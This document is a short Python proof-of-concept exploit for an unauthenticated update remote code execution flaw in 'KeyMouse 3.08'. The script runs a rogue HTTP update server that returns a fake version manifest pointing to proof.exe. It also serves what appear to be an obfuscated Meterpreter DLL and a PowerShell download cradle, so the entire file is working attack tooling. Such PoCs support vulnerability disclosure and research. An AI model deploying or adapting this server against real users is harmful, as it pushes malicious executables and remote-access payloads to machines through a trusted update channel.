#!/usr/bin/env python3
# PoC script for ZZ Inc. KeyMouse 3.08 (Windows) Unauthenticated Update Remote Code Execution Vulnerability

from http.server import BaseHTTPRequestHandler, HTTPServer

version_txt = b'''{"version": "4.00",
"file": "proof.exe",
"history": "4.00 - Vulnerable Update Procedure\r\nRecommend using TLS/HTTPS\r\nRecommend
checking signature of binary."
}'''

class HTTPHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if "versions.txt" in self.path or "version.txt" in self.path:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(version_txt)
        elif "proof.exe" in self.path:
            self.send_response(200)
            self.end_headers()
            with open("proof.exe", "rb") as f:
                self.wfile.write(f.read())
        elif "xor_met.dll" in self.path:
            self.send_response(200)
            self.end_headers()
            with open("xor_met.dll", "rb") as f:
                self.wfile.write(f.read())
        elif "download_cradle.ps1" in self.path:
            self.send_response(200)
            self.end_headers()
            with open("download_cradle.ps1", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    webserver = HTTPServer(("0.0.0.0", 80), HTTPHandler)

    print("Runing Server")
    try:
        webserver.serve_forever()
    except KeyboardInterrupt:
        pass

    webserver.server_close()